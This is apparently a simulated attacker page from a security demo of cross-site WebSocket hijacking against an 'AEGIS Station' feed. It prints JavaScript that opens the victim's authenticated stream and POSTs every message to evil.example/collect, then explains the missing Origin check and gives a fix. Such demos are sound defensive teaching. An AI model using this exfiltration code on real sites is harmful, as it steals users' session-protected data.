SIMULATED ATTACKER PAGE — evil.example

This page simulates what an attacker's website can do when a victim visits it while authenticated to AEGIS Station. It connects to the station's unauthenticated WebSocket feed cross-origin and exfiltrates all data received.

evil.example → /ws/feed (victim's session)
--:--:--→CSWSH: Connecting to victim's station feed…

What the attacker's JS does

// On evil.example — runs in victim's browser
const src = new EventSource(
  "https://aegis-station.local/ws/feed"
);
// Browser attaches victim's session cookie ↑
src.onmessage = (e) => {
  // Exfiltrate every message
  fetch("https://evil.example/collect", {
    method: "POST",
    body:   e.data,
  });
};

Why it works

1. No Origin check — the server never validates where the request comes from.

2. Cookie-carrying — browsers automatically attach the victim's session cookie to same-site SSE connections.

3. Wildcard CORS — Access-Control-Allow-Origin: * allows any domain to read the response.

Fix: validate Origin header server-side; require session for stream access
